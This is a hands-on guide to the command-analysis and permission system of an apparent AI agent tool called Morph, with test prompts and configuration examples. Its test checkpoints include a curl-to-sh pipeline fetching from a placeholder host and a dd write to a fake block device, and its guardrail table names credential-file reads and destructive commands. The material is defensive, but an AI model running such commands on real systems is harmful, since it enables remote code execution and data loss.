# Morph Command Handling: Hands-On Guide and Reference

This guide explains the complete path from a model requesting a command to Morph starting a process. It uses the
existing `command-e2e` profile and `run_chat` utility throughout.

The three systems involved are different:

| System | Question it answers |
| --- | --- |
| Command analysis | What will this request execute or access? |
| Command policy (`exec.*Commands`) | Is any analyzed invocation denied or required to ask? |
| Permission policy (`permissions`) | May this actor perform every operation produced by the plan? |

A command starts only after all three agree.

## 1. Use the Existing Test Environment

Keep using the original environment:

```text
profile:    command-e2e
workspace:  /var/folders/_3/h74bbrk10fbcbdg0mrgkw2hw0000gn/T/tmp.ymYUzq2igR
config:     ~/.morph/profiles/command-e2e/config.yaml
test util:  run_chat <<'PROMPT'
```

Confirm the workspace:

```console
tmp.ymYUzq2igR pwd
/var/folders/_3/h74bbrk10fbcbdg0mrgkw2hw0000gn/T/tmp.ymYUzq2igR
```

The relevant baseline configuration is:

```yaml
fs:
    noProfileAccess: true
    roots:
        - /var/folders/_3/h74bbrk10fbcbdg0mrgkw2hw0000gn/T/tmp.ymYUzq2igR

exec:
    allowCommands:
    askCommands:
    denyCommands:
    shell: ""

cap:
    exec: true

permissions:
    preset: approve
    rules:
```

After every configuration edit, validate and reload it:

```console
tmp.ymYUzq2igR morph --profile command-e2e doctor
```

An empty selector value means no selectors are configured. In examples that use `[]`, the empty list has the same
meaning but is more explicit.

Do not run the destructive examples against real devices, credentials, system paths, or important files.

## 2. The Complete Decision Path

Every `run_command` call follows this order:

```text
model/tool request
    │
    ├─ 1. capability check: cap.exec must be enabled
    ├─ 2. input validation
    ├─ 3. command analysis creates one immutable plan
    ├─ 4. command guardrails evaluate the complete plan
    ├─ 5. plan becomes permission operations
    ├─ 6. permission policy evaluates every operation
    ├─ 7. deny wins, or all asks become one atomic approval
    ├─ 8. approved operations are rechecked
    └─ 9. the already-analyzed plan is executed
```

This produces four important guarantees:

1. Morph authorizes the same executable path and plan that it later executes.
2. Every statically visible command and redirect is checked before any process starts.
3. A denial anywhere blocks the entire plan.
4. A compound plan is approved as one batch, not as unrelated partial approvals.

`full_access` bypasses command guardrails, permission rules, filesystem-root decisions, and approvals. It does not
bypass capability checks, invalid input, syntax errors, NUL checks, analysis limits, missing executables, or process
construction errors.

## 3. Know the Command Tool Contract

`run_command` is for short-lived, non-interactive work.

| Input | Meaning | Rules |
| --- | --- | --- |
| `mode` | `direct` or `posix_shell` | Defaults to `direct` |
| `command` | Executable token or complete shell source | Required |
| `args` | Literal direct-mode argument vector | Forbidden in `posix_shell` |
| `cwd` | Working directory | Absolute, or relative to the workspace root |
| `env` | Name/value overrides | Duplicate or invalid names are rejected |
| `timeout_seconds` | Runtime limit | Default 30 seconds; maximum 120 |

The result contains:

| Output | Meaning |
| --- | --- |
| `exit_code` | Process exit code; `-1` after timeout |
| `stdout`, `stderr` | Captured output, each bounded by the tool output limit |
| `timed_out` | Whether Morph terminated the process tree |
| `timeout_seconds` | Effective timeout |
| `elapsed_seconds` | Observed runtime |
| `remaining_seconds` | Unused timeout budget |

Output is capped at 256 KiB. On timeout, Morph terminates the main process and its child/background process group.

## 4. Start with Direct Mode

Run a literal command:

```console
tmp.ymYUzq2igR run_chat <<'PROMPT'
Use run_command exactly once:
- mode: direct
- command: printf
- args: ["%s\n", "safe-direct"]
Report the permission outcome and stdout.
PROMPT
```

Expected under `permissions.preset: approve`:

```text
Permission outcome: allowed
safe-direct
```

Direct mode performs these steps:

1. Resolve `printf` once using the effective `PATH`.
2. Record both the caller's token (`printf`) and the absolute resolved path.
3. Preserve `["%s\n", "safe-direct"]` exactly.
4. Execute the resolved file without a shell.

Direct arguments are literal:

| Argument text | Direct-mode behavior |
| --- | --- |
| `$HOME` | Passed as the five literal characters |
| `*.go` | Passed literally; no glob expansion |
| `>` | Passed as an argument; no redirect |
| `|` | Passed as an argument; no pipeline |
| spaces inside one array item | Remain one argument |

Use direct mode unless shell grammar is required. It is easier to analyze, match, and approve safely.

### Zero arguments are valid

Direct mode does not infer behavior from the presence of `args`. A zero-argument command is explicit:

```console
tmp.ymYUzq2igR run_chat <<'PROMPT'
Use run_command exactly once:
- mode: direct
- command: pwd
- args: []
Report the permission outcome and stdout.
PROMPT
```

### Relative commands and working directories

- A bare name such as `git` is resolved through `PATH`.
- A relative path containing a separator, such as `./tool`, is resolved relative to `cwd`.
- An omitted `cwd` uses the configured workspace root.
- A relative `cwd` is resolved under the workspace root.
- The effective working directory is also checked as a file-read permission operation.

## 5. Use POSIX Shell Mode Only for Shell Grammar

Run a pipeline:

```console
tmp.ymYUzq2igR run_chat <<'PROMPT'
Use run_command exactly once:
- mode: posix_shell
- command: printf '%s\n' alpha beta | sed -n '2p'
Report the permission outcome and stdout.
PROMPT
```

Morph parses this into two invocations in one pipeline:

```text
printf ["%s\n", "alpha", "beta"]
sed    ["-n", "2p"]
```

Both invocations must pass before `/bin/sh -c` starts.

Shell mode:

- accepts POSIX shell syntax;
- parses pipelines, compound commands, substitutions, nested commands, functions, and redirects;
- uses `exec.shell` when configured;
- otherwise uses `/bin/sh` on non-Windows systems;
- invokes the shell as a non-login shell with `-c`;
- removes `ENV` and `BASH_ENV` startup hooks.

This is invalid because shell mode does not accept a separate argument vector:

```yaml
mode: posix_shell
command: printf '%s\n' hello
args: [extra]
```

Put the complete source in `command`.

### Configure the shell

```yaml
exec:
    shell: /bin/sh
```

The path must be absolute. If a POSIX shell is unavailable, the plan is incomplete rather than silently switching to
another shell dialect.

Windows direct mode is supported through the Go process APIs. Direct execution rejects `.bat`, `.cmd`, and `.ps1`
targets because those require interpreter dispatch. Morph does not analyze `cmd.exe` or PowerShell syntax.

## 6. Understand the Analyzed Plan

The plan is Morph's shared source of truth for command policy, permissions, approval identity, and execution.

| Plan fact | Purpose |
| --- | --- |
| Mode and shell path | Distinguish literal execution from shell execution |
| Invocation list | Every statically visible executable and argument vector |
| Resolved executable paths | Bind authorization to the file that will execute |
| Redirect list | Produce file read/create/update operations |
| Pipeline membership | Detect relationships such as download-to-shell |
| Working-directory identity | Bind approvals without storing raw external paths |
| Environment digest | Bind approvals without storing raw environment values |
| Completeness and dynamic reasons | Prevent uncertain plans from receiving silent static authorization |
| Plan digest | Bind all command facts into one identity |

The same prepared plan is passed to the handler. Morph does not parse one representation and later reconstruct a
different command.

### Valid, incomplete, and invalid

| State | Meaning | Result outside `full_access` |
| --- | --- | --- |
| Complete | Every relevant executable, argument, and redirect is statically known | Continue through policy |
| Incomplete | Syntax is valid, but some behavior depends on runtime state | Interactive approval; unattended denial |
| Invalid | Morph cannot safely construct or analyze the request | Reject before permission evaluation |

Incomplete reasons are:

| Reason | Typical source |
| --- | --- |
| `dynamic_executable` | A variable or ambiguous wrapper chooses the command |
| `dynamic_argument` | Expansion or substitution determines an argument |
| `dynamic_redirect` | Expansion determines a redirect path |
| `indirect_execution` | An interpreter, build tool, package runner, or runtime-loaded script |
| `execution_environment` | `PATH`, loader variables, or environment mutation |
| `shell_state` | Functions, stateful builtins, or working-directory changes |
| `shell_unavailable` | The configured POSIX shell cannot be used |

Invalid input includes empty commands, invalid modes, shell syntax errors, NUL bytes, excessive input, excessive
arguments, missing direct executables, invalid environment entries, and unsupported interpreter-dispatched scripts.

Current analysis limits:

| Limit | Value |
| --- | --- |
| Command source | 64 KiB |
| Direct arguments | 1,024 |
| Shell AST nodes | 10,000 |
| Invocations | 512 |
| Redirects | 512 |
| Nested command analysis | 16 levels |

## 7. Configure Typed Command Selectors

The same selector shape is used by:

- `exec.allowCommands`;
- `exec.askCommands`;
- `exec.denyCommands`;
- `permissions.rules[].commands`;
- delegated command scopes.

Full selector shape:

```yaml
- executable: git
  resolvedPath: /usr/bin/git
  arguments: [status, --short]
  argumentPrefix: [status]
  modes: [direct]
  allowIndirect: false
  requireComplete: true
```

Do not use `arguments` and `argumentPrefix` together.

| Field | Match |
| --- | --- |
| `executable` | The exact command token supplied by the caller |
| `resolvedPath` | The normalized absolute executable path |
| `arguments` | The complete argument vector; `[]` means exactly zero arguments |
| `argumentPrefix` | The beginning of the argument vector |
| `modes` | `direct`, `posix_shell`, or both |
| `allowIndirect` | Must be `true` to match an invocation classified as indirect |
| `requireComplete` | `true` matches complete plans; `false` matches incomplete plans; omitted matches either |

Selector defaults:

| Location | Default mode |
| --- | --- |
| Allow selector | `direct` |
| Ask selector | `direct` |
| Deny selector | `direct` and `posix_shell` |

Other rules:

- At least one of `executable` or `resolvedPath` is required.
- `resolvedPath` must be absolute.
- Omitted arguments match any argument vector.
- Selector values are normalized and duplicates are removed.
- Matching is structural, not substring matching.
- On Windows, executable and path comparison follows Windows case behavior.

The legacy `exec.allow`, `exec.ask`, and `exec.deny` string lists are rejected. Use typed selectors only.

## 8. Learn `allowCommands`, `askCommands`, and `denyCommands`

Command-policy precedence for a complete plan is:

```text
typed deny
    > structural approval requirement
    > typed ask
    > typed allow
    > ordinary allow
```

Their meanings are:

| Setting | Behavior |
| --- | --- |
| `denyCommands` | One matching invocation denies the whole plan |
| `askCommands` | One matching invocation makes the whole plan require approval |
| `allowCommands` | Records a match only if every invocation matches; it is not a restrictive allowlist |

Two consequences matter:

1. An unmatched command is not denied merely because `allowCommands` is non-empty.
2. `allowCommands` cannot bypass a structural approval or the permission system.

### Checkpoint A: exact ask

Configure:

```yaml
exec:
    allowCommands: []
    askCommands:
        - executable: printf
          arguments: [ask-selector]
          modes: [direct]
    denyCommands: []
    shell: ""
```

Run:

```console
tmp.ymYUzq2igR run_chat <<'PROMPT'
Use run_command exactly once:
- mode: direct
- command: printf
- args: ["ask-selector"]
Report the permission outcome and stdout.
PROMPT
```

Morph should show an approval prompt. Choose `n` while testing. Change the argument to `other` and the selector no
longer matches.

### Checkpoint B: exact deny

Configure:

```yaml
exec:
    allowCommands: []
    askCommands:
        - executable: printf
          arguments: [ask-selector]
          modes: [direct]
    denyCommands:
        - executable: printf
          arguments: [deny-selector]
    shell: ""
```

Run direct mode:

```console
tmp.ymYUzq2igR run_chat <<'PROMPT'
Use run_command exactly once:
- mode: direct
- command: printf
- args: ["deny-selector"]
Report the permission outcome and stdout.
PROMPT
```

Then shell mode:

```console
tmp.ymYUzq2igR run_chat <<'PROMPT'
Use run_command exactly once:
- mode: posix_shell
- command: printf deny-selector
Report the permission outcome and stdout.
PROMPT
```

Both are denied because deny selectors default to both modes. No approval can override a typed deny.

### Command token versus resolved path

These are different caller tokens:

```text
printf
/usr/bin/printf
```

An `executable: printf` selector does not match a caller that explicitly supplied `/usr/bin/printf`.

Confirm the recorded macOS path:

```console
tmp.ymYUzq2igR test -x /usr/bin/printf && echo /usr/bin/printf
/usr/bin/printf
```

Use `resolvedPath` when the executable file matters:

```yaml
exec:
    askCommands:
        - resolvedPath: /usr/bin/printf
          arguments: [ask-selector]
          modes: [direct]
```

Use both fields when both the token and file must match.

### Exact arguments versus a prefix

Exact:

```yaml
- executable: git
  arguments: [status, --short]
  modes: [direct]
  requireComplete: true
```

Matches only:

```text
git status --short
```

Prefix:

```yaml
- executable: git
  argumentPrefix: [push]
  modes: [direct, posix_shell]
  requireComplete: true
```

Matches:

```text
git push
git push origin main
```

Does not match:

```text
git status
```

Prefer exact arguments. Use a prefix only when every suffix is intentionally covered.

## 9. See Atomic Compound-Plan Enforcement

Keep the `git push` deny selector:

```yaml
exec:
    allowCommands: []
    askCommands: []
    denyCommands:
        - executable: git
          argumentPrefix: [push]
          modes: [direct, posix_shell]
          requireComplete: true
    shell: ""
```

Confirm that the checkpoint file does not exist. If it does, choose another unused name in both commands:

```console
tmp.ymYUzq2igR test ! -e result-atomic.txt && echo ready
ready
```

Run:

```console
tmp.ymYUzq2igR run_chat <<'PROMPT'
Use run_command exactly once:
- mode: posix_shell
- command: printf '%s\n' before > result-atomic.txt && git push
Report the permission outcome. Do not retry.
PROMPT
```

Morph analyzes:

1. `printf`;
2. the `result-atomic.txt` create redirect;
3. `git push`.

The denied `git push` blocks the entire plan before the shell starts:

```console
tmp.ymYUzq2igR test ! -e result-atomic.txt && echo unchanged
unchanged
```

This rule applies to pipelines, `&&`, `||`, sequences, substitutions, nested shell source, and other statically
discoverable compound structures.

## 10. Understand Structural Guardrails

Structural guardrails run after typed deny and before typed ask or allow. They require approval rather than silently
allowing risky structures.

| Category | Examples |
| --- | --- |
| Managed-browser attachment | CDP/DevTools endpoint or Morph browser debugging artifacts |
| Download to shell | `curl ... \| sh`, `wget ... \| bash` |
| Incomplete structure | Dynamic executable, argument, redirect, environment, or shell state |
| Protected reads | `.env`, `.netrc`, `.ssh`, Morph credential/auth paths |
| Protected redirects | `/etc`, `/dev`, `.ssh`, `.morph` |
| Destructive filesystem | Recursive root removal, destructive `find`, `xargs rm` |
| Dangerous permissions | World-writable `chmod`, recursive root `chown` |
| Machine control | Shutdown, reboot, poweroff, halt, service stop/disable/mask |
| Disk operations | Formatting, dangerous `dd`, block-device output |
| Database destruction | `DROP`, `TRUNCATE`, `DELETE` without `WHERE` |
| Process destruction | Kill-all, forceful `pkill` |
| Runtime code | Shell `-c`, interpreter `-c`/`-e`, fork-bomb patterns |
| Credential exposure | Credential-file reads or exfiltration patterns |

These checks use parsed executable and argument facts. Raw-pattern checks only increase caution; they never grant
access.

### Checkpoint C: block-device protection

This is safe only because the fake device path should not exist and `count=0` requests no copy. Deny the prompt:

```console
tmp.ymYUzq2igR run_chat <<'PROMPT'
Use run_command exactly once:
- mode: direct
- command: dd
- args: ["if=/dev/null", "of=/dev/sdz-morph-command-e2e", "count=0"]
Report the permission outcome.
PROMPT
```

Expected reason:

```text
command writes directly to a block device
```

The prompt contains at least:

```text
read working directory
execute process dd
```

### Checkpoint D: managed-browser attachment

Run and deny:

```console
tmp.ymYUzq2igR run_chat <<'PROMPT'
Use run_command exactly once:
- mode: direct
- command: printf
- args: ["%s\n", "http://127.0.0.1:9222/json/version"]
Report the permission outcome.
PROMPT
```

Even though `printf` does not connect to anything, the argument statically references Morph's managed debugger
endpoint. Morph adds a browser-connect operation and asks with explicit attachment wording. This prevents a seemingly
ordinary process rule from silently authorizing access to the managed browser.

### Checkpoint E: download-to-shell

```console
tmp.ymYUzq2igR run_chat <<'PROMPT'
Use run_command exactly once:
- mode: posix_shell
- command: curl https://morph-command-e2e.invalid/install.sh | sh
Report the permission outcome.
PROMPT
```

In the recorded session, the model refused before calling `run_command`. That is a model-level safety outcome, not a
Morph command-policy decision. If the tool is called, Morph recognizes the pipeline structurally and requires
approval. Do not approve remote code execution merely to observe it.

## 11. Handle Incomplete and Indirect Execution

### Incomplete plans

Run:

```console
tmp.ymYUzq2igR run_chat <<'PROMPT'
Use run_command exactly once:
- mode: direct
- command: python3
- args: ["-c", "print('incomplete-python')"]
Report the permission outcome and stdout.
PROMPT
```

An interpreter with opaque inline source can discover behavior that the outer analyzer cannot represent as a fixed
set of invocations. The plan is incomplete and requires an interactive local-owner approval.

Incomplete plans:

- cannot be silently authorized by a static `allowCommands` match;
- require one exact, atomic approval on CLI or TUI;
- are hard-denied for unattended actors;
- may execute under `full_access` only after ordinary validation succeeds.

### Indirect launchers

Morph classifies these executable families as indirect:

```text
make xargs npm npx yarn pnpm bun cargo go sudo
sh bash zsh ksh python python2 python3 node ruby perl
```

They may load makefiles, scripts, hooks, plugins, package metadata, stdin, or other instructions after authorization.

A selector does not match an indirect invocation unless it opts in:

```yaml
- executable: make
  arguments: [--version]
  modes: [direct]
  allowIndirect: true
  requireComplete: true
```

`allowIndirect` means “this selector may match an indirect launcher.” It does not make runtime descendants visible,
contained, or automatically allowed by the permission system.

### Checkpoint F: `make --version`

Reset command policy:

```yaml
exec:
    allowCommands: []
    askCommands: []
    denyCommands: []
    shell: ""
```

Run:

```console
tmp.ymYUzq2igR run_chat <<'PROMPT'
Use run_command exactly once:
- mode: direct
- command: make
- args: ["--version"]
Report the permission outcome and first stdout line.
PROMPT
```

Under `approve`, the process operation carries both:

```text
execution
indirect_execution
```

The built-in permission preset therefore asks. Adding the selector to `exec.allowCommands` does not bypass that
permission effect.

## 12. See How a Plan Becomes Permission Operations

Morph evaluates permission policy per operation, not once against a flat command string.

| Plan fact | Permission operation |
| --- | --- |
| Working directory | `file/read` with `read` effect |
| `run_command` invocation | `process/execute` with `execution` |
| `process start` invocation | `process/start` with `execution, write` |
| Indirect invocation | Adds `indirect_execution` |
| Input redirect | `file/read` with `read` |
| New output redirect | `file/create` with `write` |
| Existing output redirect | `file/update` with `write` |
| `/dev/null` redirect | Ignored as a file operation |
| Managed-debugger reference | `browser/connect` with `execution, external_system` |

Certain `morph auth` subcommands also add effects:

| Command family | Added effect |
| --- | --- |
| Identity mutation | `credential_bearing`, `privilege_changing` |
| Token generation | `credential_bearing` |
| Token/session revocation | `destructive` |
| Authorization grant/revoke | `privilege_changing` |
| Audit prune | `destructive` |

Every operation is evaluated. A single deny blocks execution. If one or more operations ask and none deny, Morph
creates one approval covering the complete operation set.

### Redirect checkpoint

Run a workspace write:

```console
tmp.ymYUzq2igR run_chat <<'PROMPT'
Use run_command exactly once:
- mode: posix_shell
- command: printf '%s\n' workspace-write > result.txt
Report the permission outcome and stdout.
PROMPT
```

The plan contains `printf` plus a file create/update operation. Because `result.txt` is inside `fs.roots`, the
`approve` preset permits the write.

An external redirect carries `targetScope: external`; the `approve` preset asks for external writes. Redirects into
protected paths also trigger structural approval.

Redirect authorization is lexical preflight. It does not provide race-safe filesystem containment against a path
being swapped after authorization.

## 13. Understand Permission Context

A permission decision combines who is acting with what operation is requested.

### Caller context

| Dimension | Values relevant to commands |
| --- | --- |
| Actor | `local_owner`, `gateway_user`, `automation`, `subagent`, `acp_client`, `rpc_client` |
| Surface kind | `local`, `gateway`, `automation`, `rpc`, `acp` |
| Surface | `cli`, `tui`, `telegram`, `slack`, `http`, `automation`, `rpc`, `acp` |
| Identity | Actor ID, profile, session, run, and optional parent actor |
| Delegated scope | Optional maximum resources, actions, effects, targets, networks, and commands |

Authentication establishes identity; it does not turn a remote caller into `local_owner`.

### Operation context

| Dimension | Command examples |
| --- | --- |
| Tool | `run_command` or `process` |
| Resource | `process`, `file`, or `browser` |
| Action | `execute`, `start`, `read`, `create`, `update`, or `connect` |
| Effects | `execution`, `write`, `indirect_execution`, `external_system`, and others |
| Target | File target, structured browser target, or typed command target |
| Scope | `workspace` or `external` |

For a rule, an omitted match field is a wildcard. For `effects`, every effect named by the rule must be present on the
operation; the operation may contain additional effects.

## 14. Choose a Permission Preset

| Preset | Local command behavior | Non-local behavior |
| --- | --- | --- |
| `ask` | Asks for execution and network, plus risky effects | Denied unless a configured rule matches |
| `approve` | Allows ordinary local work; asks for risky effects | Denied unless a configured rule matches |
| `custom` | Uses configured rules and defaults only | Uses configured rules and defaults only |
| `full_access` | Bypasses ordinary policy and command guardrails | Also unrestricted |

The `approve` preset asks for:

- destructive effects;
- credential-bearing effects;
- privilege-changing effects;
- writes outside the workspace;
- indirect execution.

The `ask` preset includes all `approve` protections and additionally asks for ordinary execution and network effects.

Inspect or change the preset:

```console
tmp.ymYUzq2igR morph --profile command-e2e permissions preset
tmp.ymYUzq2igR morph --profile command-e2e permissions preset approve
```

`full-access` requires explicit CLI confirmation:

```console
tmp.ymYUzq2igR morph --profile command-e2e permissions preset full-access --yes
```

Do not use `full_access` as a substitute for understanding a rule.

### Custom defaults

Use `custom` when you want no built-in preset rules:

```yaml
permissions:
    preset: custom
    default: deny
    surfaceKinds:
        local: ask
    surfaces:
        cli: allow
```

Without a matching configured rule, exact `surfaces` take precedence over `surfaceKinds`, which take precedence over
`default`. The `ask` and `approve` presets replace these defaults with their own deny-by-default surface posture.

## 15. Write Permission Rules

A rule can match:

| Field | Matches |
| --- | --- |
| `profiles` | Profile name |
| `actors`, `actorIds` | Actor kind and exact identity |
| `parentActors` | Parent actor kind for delegated work |
| `surfaceKinds`, `surfaces` | Entry-point family or exact entry point |
| `tools` | Tool name |
| `resources` | Operation resource |
| `actions` | Operation action |
| `effects` | Required effects |
| `targetScopes` | `workspace` or `external` |
| `targetPrefixes` | Prefix of an ordinary target |
| `network` | Structured network selector |
| `commands` | Typed command selector |
| `decision` | `allow`, `ask`, or `deny` |
| `reason` | Human-readable explanation |

Command selectors cannot be combined with `network` or `targetPrefixes` in the same rule. If `commands` is present,
the rule's resource must permit `process`, and its action must permit `execute` or `start`.

### Rule selection

Permission evaluation order is:

```text
1. delegated-scope ceiling
2. full_access
3. hard deny
4. configured rules
5. preset rules
6. exact-surface default
7. surface-kind default
8. policy default
9. owner requirement
10. indirect-execution escalation
11. structural approval escalation
```

Within configured rules:

1. `deny` beats `ask`;
2. `ask` beats `allow`;
3. equal decisions use the more specific rule;
4. equal specificity uses the lexically earlier rule name.

A broad deny therefore beats a narrow allow. Keep deny scopes deliberate.

Configured rules are evaluated before built-in preset rules. This permits a narrow configured allow to override a
preset's general ask, except when hard-deny, delegated-scope, ownership, or later approval escalation applies.

### Allow exactly `make --version`

Add:

```yaml
permissions:
    preset: approve
    rules:
        - name: allow exact local make version query
          actors: [local_owner]
          surfaces: [cli]
          tools: [run_command]
          resources: [process]
          actions: [execute]
          effects: [execution, indirect_execution]
          commands:
              - executable: make
                arguments: [--version]
                modes: [direct]
                allowIndirect: true
                requireComplete: true
          decision: allow
          reason: approved local make version query
```

Run Checkpoint F again. The configured rule explicitly names the indirect effect and exact command, so it may allow
that invocation without a prompt.

It does not allow:

```text
make
make test
/usr/bin/make --version
make --version in posix_shell mode
an incomplete make plan
the same command from TUI, automation, gateway, or RPC
```

Change the selector deliberately if any of those should be included.

### Ask for `git push`

Command policy is the simplest place to ask regardless of the permission preset:

```yaml
exec:
    askCommands:
        - executable: git
          argumentPrefix: [push]
          modes: [direct, posix_shell]
          requireComplete: true
```

Permission rules are better when the decision depends on actor, surface, tool, resource, effect, or target scope:

```yaml
permissions:
    rules:
        - name: ask local cli before git push
          actors: [local_owner]
          surfaces: [cli]
          tools: [run_command]
          resources: [process]
          actions: [execute]
          commands:
              - executable: git
                argumentPrefix: [push]
                modes: [direct, posix_shell]
                requireComplete: true
          decision: ask
          reason: confirm repository publication
```

### Deny an exact command

Use `exec.denyCommands` for a command-specific hard stop:

```yaml
exec:
    denyCommands:
        - executable: printf
          arguments: [deny-selector]
```

Use a permission deny when caller or operation context matters:

```yaml
permissions:
    rules:
        - name: deny automation invoking sh
          actors: [automation]
          surfaces: [automation]
          tools: [run_command]
          resources: [process]
          actions: [execute]
          commands:
              - executable: sh
                modes: [direct, posix_shell]
                allowIndirect: true
          decision: deny
          reason: automation may not invoke sh explicitly
```

## 16. Understand Interactive Approval and Grants

An `ask` decision can prompt only an interactive `local_owner` on CLI or TUI.

The prompt shows:

- summary;
- combined effects;
- reason;
- up to the presented operation list;
- request expiry;
- available choices.

Choices:

| Choice | Key | Scope |
| --- | --- | --- |
| Allow once | `y` | One matching use; maximum 2 minutes |
| Allow for session | `s` | Same session; maximum 8 hours |
| Always allow | `a` | Cross-session until revoked |
| Deny | `n` | Reject this request |

`Always allow` is unavailable when any operation has one of these effects:

```text
destructive
credential_bearing
privilege_changing
execution
network
external_system
```

Because commands carry `execution`, command prompts normally offer once, session, and deny—not always.

### What a grant is bound to

Grant identity includes:

- actor and parent actor;
- profile;
- surface kind and exact surface;
- tool, resource, action, and effects;
- ordinary, network, or typed command target;
- working-directory identity;
- environment digest;
- plan digest, completeness, dynamic reasons, and operation counts;
- delegated scope.

Changing the command, arguments, mode, executable path, plan structure, environment semantics, actor, surface, or
scope can require a new approval.

### Approval lifecycle

Approval requests start `pending` and become:

```text
approved | denied | expired | cancelled | failed
```

Grants start `active` and become:

```text
consumed | expired | revoked
```

Defaults:

| Setting | Default |
| --- | --- |
| Pending request TTL | 2 minutes |
| Once grant TTL | 2 minutes |
| Session grant TTL | 8 hours |
| Request retention | 30 days |
| Grant retention | 30 days |
| Cleanup interval | 1 hour |
| Cleanup batch size | 100 |
| Prompt rate limit | 10 per minute |

Identical concurrent requests may be coalesced into one prompt. Excess new prompts are rate-limited.

Configure retention and prompt controls when the defaults are unsuitable:

```yaml
permissions:
    requestRetention: 720h
    grantRetention: 720h
    cleanupInterval: 1h
    cleanupBatchSize: 100
    approvalRateLimit: 10
    approvalRateWindow: 1m
```

Requests and grants are stored in the configured state backend. On daemon recovery, stale pending requests are
cancelled and retention cleanup runs. Non-pending requests and grants remain available until expiry, revocation,
deletion, or pruning.

### Manage requests and grants

```console
tmp.ymYUzq2igR morph --profile command-e2e permissions list
tmp.ymYUzq2igR morph --profile command-e2e permissions pending
tmp.ymYUzq2igR morph --profile command-e2e permissions grants
tmp.ymYUzq2igR morph --profile command-e2e permissions explain <approval-id>
tmp.ymYUzq2igR morph --profile command-e2e permissions inspect <approval-or-grant-id>
tmp.ymYUzq2igR morph --profile command-e2e permissions approve <approval-id> --scope once
tmp.ymYUzq2igR morph --profile command-e2e permissions deny <approval-id>
tmp.ymYUzq2igR morph --profile command-e2e permissions revoke <approval-or-grant-id>
tmp.ymYUzq2igR morph --profile command-e2e permissions delete <approval-or-grant-id>
tmp.ymYUzq2igR morph --profile command-e2e permissions prune --dry-run
tmp.ymYUzq2igR morph --profile command-e2e permissions prune
```

`inspect` displays a grant; when given an approval ID, it follows that request's linked grant.

Pending requests cannot be deleted. Active grants must be revoked before deletion.

## 17. Configure Unattended Execution

Gateway, automation, RPC, ACP, and delegated actors cannot answer a local prompt. An `ask` result fails immediately
with `approval_required`; it does not wait for later approval or create a request that can be approved afterward.

Incomplete command plans are denied on unattended surfaces.

To let one automation run one command, configure it before the run:

```yaml
permissions:
    preset: approve
    rules:
        - name: allow report job git status
          actors: [automation]
          actorIds: [auto_report]
          surfaces: [automation]
          tools: [run_command]
          resources: [process]
          actions: [execute]
          effects: [execution]
          commands:
              - executable: git
                arguments: [status, --short]
                modes: [direct]
                requireComplete: true
          decision: allow
          reason: approved report repository status
```

This binds the actor ID, surface, tool, operation, and exact complete command.

Avoid:

```yaml
- actors: [automation]
  resources: [process]
  decision: allow
```

That wildcard rule authorizes every matching process action and command shape.

Delegated actors have an additional scope ceiling. A child cannot exceed the intersection of its parent's scope and
the scope delegated to it. A permission rule cannot widen that ceiling.

## 18. Apply the Same Model to Background Processes

The `process` tool uses the same command analyzer, command policy, and permission rules for `action: start`.

| Process action | Permission operation |
| --- | --- |
| `start` | `process/start` with `execution, write`, plus cwd/redirect operations |
| `status` | `process/read` |
| `read` | `process/read` |
| `stop` | `process/stop` with `destructive, execution, write` |
| `list` | `process/list` |

`process start` accepts the same `mode`, `command`, `args`, `cwd`, and `env` fields. It also accepts a label and an
output-buffer limit. It returns a process ID used by status, read, and stop operations.

A permission rule restricted to:

```yaml
tools: [run_command]
actions: [execute]
```

does not allow:

```yaml
tools: [process]
actions: [start]
```

Include both only when both execution styles are intended.

## 19. Observe Decisions and Execution

With tracing enabled, each evaluated operation emits `permission.decision.observed`. Its sanitized payload includes:

- actor and surface;
- tool, resource, action, and effects;
- decision, reason code, matched rule, and preset;
- command mode, executable basename, invocation and redirect counts;
- completeness, indirect classification, and dynamic-reason names.

It does not record the raw command argument vector in that permission payload. Command logs record execution phase,
counts, timeout, exit code, output sizes, and elapsed time.

Open the local trace viewer:

```console
tmp.ymYUzq2igR morph --profile command-e2e trace view
```

Approval status changes are also audited, while request and grant records remain inspectable through
`morph permissions`.

## 20. Diagnose an Unexpected Result

Use this order:

### `invalid_input`

Check:

- mode spelling;
- shell `args`;
- executable availability;
- POSIX syntax;
- NUL or size limits;
- duplicate or malformed environment entries;
- absolute `exec.shell`;
- selector validation.

### `command_denied` or `permission_denied`

Check:

1. `exec.denyCommands`;
2. incomplete-plan unattended denial;
3. configured permission deny rules;
4. delegated scope;
5. actor, surface, tool, resource, and action mismatches.

A deny is not approvable.

### `approval_required`

Check:

1. structural guardrail reason;
2. `exec.askCommands`;
3. preset behavior;
4. matching permission ask rule;
5. indirect-execution escalation;
6. external redirect or debugger operation;
7. whether the caller is interactive.

Use:

```console
tmp.ymYUzq2igR morph --profile command-e2e permissions list
tmp.ymYUzq2igR morph --profile command-e2e permissions explain <approval-id>
```

### A selector did not match

Compare:

- `executable` token versus `resolvedPath`;
- exact arguments versus prefix;
- direct versus shell mode;
- indirect classification and `allowIndirect`;
- completeness and `requireComplete`;
- every invocation in a compound plan.

### A previous grant was not reused

The fingerprint probably changed. Check:

- session;
- actor or surface;
- command token, resolved path, arguments, or mode;
- working directory;
- environment;
- redirects or number of operations;
- completeness or dynamic reasons;
- delegated scope.

## 21. Use This Safe Working Pattern

For a new command:

1. Prefer `direct`.
2. Run it once under `approve`.
3. Read the prompt reason and complete operation list.
4. Decide whether the risk belongs in command policy or actor-aware permission policy.
5. Use an exact typed selector.
6. Add `requireComplete: true`.
7. Add `allowIndirect: true` only for a launcher you deliberately accept.
8. Bind unattended rules to actor ID, surface, tool, resource, action, effects, and command.
9. Test the exact match and near misses.
10. Inspect grants and revoke test grants.

Test matrix:

```text
exact intended command
one extra argument
one missing argument
explicit executable path
direct mode
shell wrapping
compound plan with another invocation
different cwd
environment override
interactive surface
unattended surface
```

## 22. Compact Configuration Example

This configuration allows one ordinary local query, asks before publication, asks before direct `make`, and keeps
unattended callers denied by the `approve` preset:

```yaml
permissions:
    preset: approve
    rules:
        - name: allow exact local git status
          actors: [local_owner]
          surfaces: [cli, tui]
          tools: [run_command]
          resources: [process]
          actions: [execute]
          effects: [execution]
          commands:
              - executable: git
                arguments: [status, --short]
                modes: [direct]
                requireComplete: true
          decision: allow
          reason: approved read-only repository status

exec:
    shell: /bin/sh
    allowCommands:
        - executable: git
          arguments: [status, --short]
          modes: [direct]
          requireComplete: true
    askCommands:
        - executable: git
          argumentPrefix: [push]
          modes: [direct, posix_shell]
          requireComplete: true
        - executable: make
          modes: [direct]
          allowIndirect: true
          requireComplete: true
    denyCommands: []
```

